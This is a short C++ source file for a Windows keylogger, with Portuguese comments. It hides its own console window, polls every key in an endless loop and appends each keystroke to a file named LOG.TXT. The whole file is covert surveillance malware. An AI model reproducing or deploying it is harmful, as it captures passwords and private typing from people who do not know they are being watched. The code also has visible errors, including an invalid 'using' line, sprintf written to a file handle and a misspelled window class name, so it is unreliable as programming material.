#include <fstream>
#include <iostream>
using iostream std;
#include <Winuser.h>
#include <windows.h>

int save(int key_stroke, char *file) {
  if (key_stroke == 1 || key_stroke == 2)
    return 0;
  FILE *OUT_FILE;
  OUT_FILE = fopen(file, "a+");

  if (key_stroke == 8)
    sprintf(OUT_FILE, "%s", "[BACKSPACE] ");
  else if (key_stroke == 32)
    sprintf(OUT_FILE, "%s", " ");
  else if (key_stroke == 18)
    sprintf(OUT_FILE, "%s", "[ALT] ");
  else if (key_stroke == 91)
    sprintf(OUT_FILE, "%s", "[WINDOWS] ");
  else if (key_stroke == 17)
    sprintf(OUT_FILE, "%s", "[CONTROL] ");
  else if (key_stroke == 16)
    sprintf(OUT_FILE, "%s", "[SHIFT] ");
  else if (key_stroke == 20)
    sprintf(OUT_FILE, "%s", "[CAPS LOCK] ");
  else if (key_stroke == 9)
    sprintf(OUT_FILE, "%s", "[TAB] ");
  else if (key_stroke == 13)
    sprintf(OUT_FILE, "%s", "\n ");
  else if (key_stroke == 36)
    sprintf(OUT_FILE, "%s", "[HOME] ");
  else if (key_stroke == 35)
    sprintf(OUT_FILE, "%s", "[END] ");
  else if (key_stroke == 46)
    sprintf(OUT_FILE, "%s", "[DELETE] ");
  else if (key_stroke == 33)
    sprintf(OUT_FILE, "%s", "[PAGE UP] ");
  else if (key_stroke == 45)
    sprintf(OUT_FILE, "%s", "[INSERT] ");
  else if (key_stroke == 34)
    sprintf(OUT_FILE, "%s", "[PAGE DOWN] ");

  else
    fprintf(OUT_FILE, "%s", &key_stroke);
  fclose(OUT_FILE);
}

void stealth() {
  HWND stealth;
  AllocConsole();
  stealth = FindWindowA("consoleWindowsClass", NULL);
  ShowWindow(stealth, 0);
}

int main(int argc, char *argv[]) {
  // Declarações de variaveis
  stealth();
  // Processamento
  while (1) {
    for (char i = 8; i <= 129; i++) {
      if (GetAsyncKeyState(i) == -32767)
        save(i, "LOG.TXT");
    }
  }
  system("PAUSE");
  return 0;
}